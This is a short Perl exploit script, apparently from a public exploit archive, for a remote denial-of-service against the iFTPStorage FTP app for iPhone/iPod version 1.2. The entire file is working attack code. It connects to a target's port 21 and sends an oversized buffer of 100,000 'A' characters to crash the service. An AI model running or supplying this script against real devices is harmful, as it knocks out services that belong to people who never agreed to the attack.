#!/usr/bin/perl

#

# Exploit: iFTPStorage for Iphone\Ipod - Remote Dos Exploit

# Date: 20/02/10

# Author: Ale46

# Software Link:

# http://itunes.apple.com/us/app/iftpstorage/id333357690?mt=8

# Version: 1.2

# Tested on: Iphone 3GS with 3.1.2 firmware

# Note: iFTSTorage Lite is also vulnerable

# Greetz: Gandalf



use IO::Socket;



if (@ARGV<1){

        print ("Usage: ./iFTPStorage <server_ip>\n");

	exit();

}



my $host = $ARGV[0];

my $port = 21;

my $stuff = "A"*100000;

my $socket = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host,

PeerPort => $port);

unless ($socket) { die "Can\'t connect to $host" }

print "Sending evil buffer..\n";

sleep(2);

print $socket $stuff;

sleep(2);

print "Crashed..";